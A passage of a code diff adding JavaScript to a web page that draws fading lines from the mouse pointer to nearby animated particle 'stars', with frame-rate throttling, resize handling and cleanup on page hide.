+    /*
+     * Instead of permanently creating 800 lines,
+     * we create them only when needed.
+     */
+
+    let lastLineUpdate = 0;
+
+    function updateConnections(timestamp) {
+
+        /*
+         * Limit line calculations to about 30fps.
+         * This keeps 800 particles smooth.
+         */
+        if (timestamp - lastLineUpdate < 33) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        lastLineUpdate = timestamp;
+
+        /*
+         * Delete old connection lines.
+         */
+        const oldLines =
+            space.querySelectorAll(
+                ".publii-star-line"
+            );
+
+        oldLines.forEach(function (line) {
+            line.remove();
+        });
+
+        /*
+         * No mouse = no connections.
+         */
+        if (mouseX < 0 || mouseY < 0) {
+            requestAnimationFrame(updateConnections);
+            return;
+        }
+
+        /*
+         * Find stars close to mouse.
+         */
+        for (let i = 0; i < stars.length; i++) {
+
+            const star = stars[i];
+
+            const dx = star.x - mouseX;
+            const dy = star.y - mouseY;
+
+            const distance =
+                Math.sqrt(dx * dx + dy * dy);
+
+            if (distance <= MOUSE_RADIUS) {
+
+                /*
+                 * Only connect fairly close stars
+                 * to the mouse.
+                 */
+                const line =
+                    document.createElement("span");
+
+                line.className =
+                    "publii-star-line";
+
+                const angle =
+                    Math.atan2(
+                        star.y - mouseY,
+                        star.x - mouseX
+                    ) * 180 / Math.PI;
+
+                line.style.left =
+                    mouseX + "px";
+
+                line.style.top =
+                    mouseY + "px";
+
+                line.style.width =
+                    distance + "px";
+
+                line.style.transform =
+                    "rotate(" + angle + "deg)";
+
+                /*
+                 * Closer = brighter.
+                 */
+                const opacity =
+                    1 - distance / MOUSE_RADIUS;
+
+                line.style.opacity =
+                    (opacity * 0.7).toFixed(2);
+
+                space.appendChild(line);
+            }
+        }
+
+        requestAnimationFrame(updateConnections);
+    }
+
+    requestAnimationFrame(updateConnections);
+
+    /* ================================
+       RESIZE
+       ================================ */
+
+    window.addEventListener(
+        "resize",
+        function () {
+
+            /*
+             * Keep stars inside the new viewport.
+             */
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+
+            stars.forEach(function (star) {
+
+                if (star.x > width) {
+                    star.x = Math.random() * width;
+                }
+
+                if (star.y > height) {
+                    star.y = Math.random() * height;
+                }
+            });
+        }
+    );
+
+    /* ================================
+       CLEANUP
+       ================================ */
+
+    window.addEventListener(
+        "pagehide",
+        function () {
+            cancelAnimationFrame(animationFrame);
+        }
+    );
+
+})();</script></body></html>
